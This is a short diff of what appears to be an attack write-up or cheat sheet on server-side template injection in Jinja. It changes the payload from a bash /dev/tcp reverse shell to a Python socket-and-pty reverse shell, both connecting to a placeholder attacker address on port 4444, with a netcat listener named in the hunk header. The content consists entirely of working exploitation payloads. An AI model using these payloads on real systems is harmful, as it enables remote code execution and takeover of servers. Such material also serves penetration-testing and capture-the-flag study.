@@ -24,5 +24,5 @@ nc -lvnp 4444
 ### SSTI payload:
 
 ```jinja
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('sh -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1').read() }}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\'').read() }}
 ```
